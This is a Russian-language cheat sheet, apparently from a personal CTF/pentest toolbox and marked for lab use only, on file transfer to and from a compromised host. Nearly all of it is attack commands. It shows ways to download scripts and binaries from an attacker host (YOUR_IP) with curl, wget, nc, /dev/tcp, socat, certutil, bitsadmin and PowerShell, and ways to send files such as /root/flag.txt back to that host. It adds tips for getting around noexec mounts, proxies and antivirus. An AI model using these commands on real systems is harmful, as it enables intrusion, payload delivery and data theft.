# TRANSFER — как закинуть скрипты на сервер и забрать файлы

Лаборатория/CTF: только свои стенды.

---

## 0. Главное: у тебя есть файлы локально, у цели — шелл

Два направления:

- **туда** — залить `privesc.sh`, `flag_hunt.sh`, бинарник;
- **обратно** — скачать флаг, дамп, БД, скриншот.

Почти всегда достаточно HTTP: ты поднимаешь сервер у себя, цель качает `curl`/`wget`.

---

## 1. Поднять сервер у себя

```bash
cd C:\Users\nispa\.vscode\projectPy\toolbox
python network/serve.py --dir . --port 8000
```

Или встроенный:

```bash
python -m http.server 8000
```

С приёмом файлов (экфильтрация):

```bash
python network/serve.py --dir . --port 8000 --upload --token s3cr3t
```

Узнай свой IP:

```bash
ipconfig            # Windows
ip a / hostname -I  # Linux
```

Цель должна видеть твой IP (в CTF обычно да, иначе — туннель/VPN).

---

## 2. Скачать на Linux-цель

```bash
curl -O http://YOUR_IP:8000/linux/privesc.sh
wget http://YOUR_IP:8000/linux/privesc.sh
```

Если curl/wget нет:

```bash
python3 -c "import urllib.request;urllib.request.urlretrieve('http://YOUR_IP:8000/x','/tmp/x')"
python2 -c "import urllib;open('/tmp/x','wb').write(urllib.urlopen('http://YOUR_IP:8000/x').read())"
perl -e 'use LWP::Simple;getstore("http://YOUR_IP:8000/x","/tmp/x")'
php -r 'file_put_contents("/tmp/x",file_get_contents("http://YOUR_IP:8000/x"));'
ruby -e 'require "open-uri"; File.write("/tmp/x", URI.open("http://YOUR_IP:8000/x").read)'
busybox wget http://YOUR_IP:8000/x -O /tmp/x
```

Через `nc`:

```bash
# у себя
nc -lvnp 9000 < linux/privesc.sh
# на цели
nc YOUR_IP 9000 > /tmp/privesc.sh
```

Через bash `/dev/tcp`:

```bash
exec 3<>/dev/tcp/YOUR_IP/8000
printf 'GET /linux/privesc.sh HTTP/1.0\r\n\r\n' >&3
cat <&3 > /tmp/privesc.sh
```

Через `socat`:

```bash
socat TCP:YOUR_IP:9000 - > /tmp/privesc.sh
```

---

## 3. Скачать на Windows-цель

PowerShell:

```powershell
iwr http://YOUR_IP:8000/x.exe -OutFile C:\Windows\Temp\x.exe
Invoke-WebRequest http://YOUR_IP:8000/x.exe -OutFile x.exe
```

certutil:

```cmd
certutil -urlcache -f http://YOUR_IP:8000/x.exe C:\Windows\Temp\x.exe
```

bitsadmin:

```cmd
bitsadmin /transfer job /download /priority high http://YOUR_IP:8000/x.exe C:\Windows\Temp\x.exe
```

curl.exe (Win10+):

```cmd
curl.exe -o x.exe http://YOUR_IP:8000/x.exe
```

---

## 4. Если скачать нельзя — вставить текстом

### heredoc (Linux)

```bash
cat > /tmp/flag_hunt.sh <<'EOF'
#!/usr/bin/env bash
find / -iname 'flag*' 2>/dev/null
EOF
chmod +x /tmp/flag_hunt.sh
```

### base64 (любой шелл)

У себя:

```bash
base64 -w0 linux/privesc.sh > /tmp/b64
```

На цели:

```bash
echo 'ТУТ_BASE64' | base64 -d > /tmp/privesc.sh
chmod +x /tmp/privesc.sh
```

Большой файл — кусками:

```bash
echo 'КУСОК1' >> /tmp/b64
echo 'КУСОК2' >> /tmp/b64
base64 -d /tmp/b64 > /tmp/x
```

### printf / echo

```bash
printf '%s\n' '#!/bin/sh' 'id' > /tmp/x.sh
```

### python (если есть)

```bash
python3 -c "open('/tmp/x','wb').write(bytes.fromhex('...'))"
```

---

## 5. SSH / SCP / SFTP

Если есть SSH:

```bash
scp linux/privesc.sh user@host:/tmp/
scp user@host:/root/flag.txt .
sftp user@host
rsync -av linux/ user@host:/tmp/linux/
```

Через stdin:

```bash
ssh user@host 'cat > /tmp/x.sh' < linux/privesc.sh
```

Монтирование:

```bash
sshfs user@host:/ /mnt/remote
```

Ключ:

```bash
scp -i id_rsa file user@host:/tmp/
```

---

## 6. Забрать файлы обратно

```bash
# цель -> твой сервер с --upload
curl -X POST --data-binary @/root/flag.txt http://YOUR_IP:8000/flag.txt?token=s3cr3t
curl -F 'f=@/root/flag.txt' http://YOUR_IP:8000/upload

# через nc
nc YOUR_IP 9000 < /root/flag.txt
# у себя: nc -lvnp 9000 > flag.txt

# через SSH
scp user@host:/root/flag.txt .
```

Вывести в консоль и скопировать:

```bash
base64 -w0 /root/flag.txt; echo
cat /root/flag.txt
```

---

## 7. Docker / Kubernetes

```bash
docker cp ./privesc.sh container:/tmp/
docker cp container:/root/flag.txt .
docker exec -i container sh -c 'cat > /tmp/x.sh' < privesc.sh

kubectl cp ./privesc.sh pod:/tmp/x.sh
kubectl cp pod:/root/flag.txt ./flag.txt
```

---

## 8. Частые проблемы

- **`/tmp` смонтирован noexec** → запускай `bash /tmp/x.sh` или `python3 /tmp/x.py`, либо пиши в `/dev/shm`, `$HOME`.
- **Нет `chmod`** → `bash script.sh` работает и без `+x`.
- **Windows-переносы** → `sed -i 's/\r$//' file` или `dos2unix`.
- **Нет curl/wget** → python/perl/php/ruby/busybox/nc.
- **Нет исходящего трафика** → SSH-туннель, `ssh -R`, или копирование через уже существующий канал; в CTF обычно есть.
- **Прокси** → `export http_proxy=http://proxy:8080`, `curl -x`.
- **Файл большой** → `gzip`/`xz`, куски base64, `split`.
- **Антивирус** (Windows) → в CTF обычно отключён; не тащи на реальные машины.
- **Права** → если не можешь писать в `/`, пиши в `/tmp`, `/dev/shm`, `$HOME`.

---

## 9. Мини-шпаргалка

```bash
# у себя
python network/serve.py --dir . --port 8000 --upload --token s3cr3t

# цель: скачать
curl -O http://IP:8000/linux/flag_hunt.sh
# цель: выполнить
bash flag_hunt.sh

# цель: отдать флаг
curl -X POST --data-binary @/root/flag.txt 'http://IP:8000/flag.txt?token=s3cr3t'
```
